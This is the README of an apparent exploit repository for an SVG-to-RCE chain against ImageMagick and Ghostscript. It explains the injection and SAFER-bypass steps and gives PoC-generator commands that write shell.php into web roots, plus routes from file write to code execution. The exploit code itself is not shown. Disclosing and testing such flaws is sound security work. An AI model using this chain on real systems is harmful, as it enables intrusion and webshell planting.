# ImagePanick

SVG-to-RCE exploit chaining ImageMagick weak default policies with Ghostscript SAFER bypass vulnerabilities.

<p align="center">
  <video src="https://github.com/user-attachments/assets/08faa7db-4dfb-43af-bac6-20ae3d83ff48">
  </video>
</p>

## Overview

A self-contained SVG file achieves **arbitrary file write** (and RCE) by chaining:

**ImageMagick - Weak Default Policies:**
- Incomplete CR sanitization in SVG parser (`\r` bypasses MVG line separation)
- Missing `msl:` in the protocol blacklist for the `image` MVG primitive

**Ghostscript 10.06.0 - SAFER Bypass Vulnerabilities:**
- `.tempfile` adds overly broad permissions (read + write + control) to the C-level permit lists
- `renamefile` allows renaming within permitted temp directories, enabling predictable filenames
- Modern SAFER (`OLDSAFER=false`) does not call `.locksafe`, leaving device parameters modifiable

One command triggers the full chain:

```
magick input.svg output.png
```

No user interaction. No special flags. No non-default configuration.

## Attack Flow

```
SVG with &#13; in <polyline points="...">
  |
  +-- Stage 1: Injected MVG "image" loads data:image/x-eps;base64,...
  |     +-- Ghostscript SAFER executes EPS payload:
  |           +-- .tempfile   --> creates writable file
  |           +-- writestring --> writes MSL XML payload to it
  |           +-- renamefile  --> renames to /tmp/payload.msl (known path)
  |
  +-- Stage 2: Injected MVG "image" loads msl:/tmp/payload.msl
        +-- ImageMagick executes MSL:
              +-- <write filename="png:/arbitrary/path/file.png"/>
                    +-- ARBITRARY FILE WRITE --> RCE
```

## Docker Lab

### Build

```bash
docker build -t imagepanick .
```

### Run

```bash
docker run --rm -p 8080:80 imagepanick
```

## PoC Generator

Generate a custom SVG payload targeting a specific OS and output path:

```bash
bash generate_poc.sh <linux|windows|mac> <output_path>
```

### Examples

```bash
# Linux - write to web root
bash generate_poc.sh linux /var/www/html/shell.php

# Windows - write to web root
bash generate_poc.sh windows C:/inetpub/wwwroot/shell.php

# macOS - write proof file
bash generate_poc.sh mac /tmp/proof.png
```

The script generates `/tmp/poc.svg`. Trigger the exploit with:

```bash
magick /tmp/poc.svg output.png
```

## Affected Software

| Software | Version | Role |
|---|---|---|
| ImageMagick | 7.1.2-13 | Weak default policies |
| Ghostscript | 10.06.0 | SAFER bypass vulnerabilities |

## Impact

Any system processing untrusted SVGs with ImageMagick is potentially affected:

- Web apps that resize or thumbnail SVG uploads
- Document processing pipelines
- CI/CD systems that process images during builds
- Any automated SVG processing workflow

Arbitrary file write trivially escalates to RCE via `~/.bashrc`, `/etc/cron.d/`, web-accessible directories, `~/.ssh/authorized_keys`, etc.

## Blog Post

Full technical writeup available at [Deep Hacking](https://blog.deephacking.tech/).

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Use it only on systems you own or have explicit permission to test. The author is not responsible for any misuse.
